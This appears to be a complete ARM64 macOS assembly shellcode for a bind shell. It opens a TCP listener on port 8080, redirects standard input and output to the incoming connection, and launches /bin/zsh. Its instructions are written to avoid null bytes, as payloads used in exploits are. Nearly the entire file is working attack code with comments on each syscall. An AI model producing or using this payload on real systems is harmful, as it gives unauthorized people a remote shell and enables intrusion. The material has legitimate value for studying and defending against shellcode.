; socket system call #97
; 	int socket(int domain, int type, int protocol);
; 		domain -> 2 (PF_INET for IPv4)
; 		type -> 1 (SOCK_STREAM for TCP)
; 		protocol -> 0 (IPPROTO_IP as dummy for IP)

; bind system call #104
; 	int bind(int socket, const struct sockaddr_in *address, socklen_t address_len);
; 		socket -> socket descriptor returned from socket
; 		address -> 16-byte sockaddr_in struct
; 			__uint8_t sin_len; -> 0 (not in use)
; 			(typedef __uint8_t) sa_family_t sin_family; -> 2 (PF_INET)
; 			(typedef __uint16_t) in_port_t sin_port; -> 8080
; 			(typedef __uint32_t) struct in_addr sin_addr; -> 0.0.0.0 (INADDR_ANY)
; 			char sin_zero[8];
; 		address_len -> 16 (length of sockaddr_in) -> 0 (x8 null byte padding)

; listen system call #106
; 	int listen(int socket, int backlog);
; 		socket -> socket descriptor
; 		backlog -> 0 (default to max number of connections to be accepted)

; accpet system call #30
; 	int accept(int socket, struct sockaddr *address, socklen_t *address_len);
; 		socket -> socket descriptor
; 		address -> 0 (ignore memory buffer containing address struct of connecting host)
; 		address_len -> 0 (ignore length of address struct)

; dup2 system call #90
; 	int dup2(int fd, int fd2);
; 		fd -> new socket descriptor returned from accept
; 		fd2 -> 0 (stdin) -> 1 (stdout) -> 2 (stderr)

; execve system call #59
; 	int execve(const char *path, char *const argv[], char *const envp[]);
; 		path -> /bin/zsh
; 		argv -> pointer to /bin/zsh
; 		envp -> 0

.global _main
.align 4

_main:
	; socket
	; mov X0, #2
	mov X3, #0x0201
	lsr X0, X3, #8
	; mov X1, #1
	lsr X1, X0, #1
	mov X2, XZR
	; mov X16, #97
	mov X3, #0x6101
	lsr X16, X3, #8
	svc #0x1234
	; mov X19, X0
	lsl X19, X0, #0

	; bind
	; mov X4, #0x0200
	mov X4, #0x0202
	lsl X4, X4, #8
	movk X4, #0x901F, lsl#16
	stp X4, XZR, [SP, #-16]!
	; mov X1, SP (shift not allowed for SP)
	add X1, SP, XZR
	; mov X2, #16
	mov X3, #0x1011
	lsr X2, X3, #8
	; mov X16, #104
	mov X3, #0x6811
	lsr X16, X3, #8
	svc #0x1234

	; listen
	; mov X0, X19
	lsl X0, X19, #0
	mov X1, XZR
	; mov X16, #106
	mov X3, #0x6A01
	lsr X16, X3, #8
	svc #0x1234

	; accept
	; mov X0, X19
	lsl X0, X19, #0
	mov X1, XZR
	mov X2, XZR
	; mov X16, #30
	mov X3, #0x1E01
	lsr X16, X3, #8
	svc #0x1234
	; mov X20, X0
	lsl X20, X0, #0

	; dup2
	; mov x16, #90
	mov X3, #0x5A01
	lsr X16, X3, #8
	; mov X1, #2
	mov X3, #0x0201
	lsr X1, X3, #8
	svc #0x1234
	mov X0, X20
	; mov X1, #1
	mov X1, #0x0101
	lsr X1, X1, #8
	svc #0x1234
	mov X0, X20
	lsr X1, X1, #1
	svc #0x1234

	; execve
	mov X3, #0x622F
	movk X3, #0x6E69, lsl#16
	movk X3, #0x7A2F, lsl#32
	movk X3, #0x6873, lsl#48
	stp X3, XZR, [SP, #-16]!
	; mov X0, SP (shift not allowed for SP)
	add X0, SP, XZR
	stp X0, XZR, [SP, #-16]!
	; mov X1, SP (shift not allowed for SP)
	add X1, SP, XZR
	mov X2, XZR
	; mov X16, #59
	mov X4, #0x3B01
	lsr X16, X4, #8
	svc #0x1234
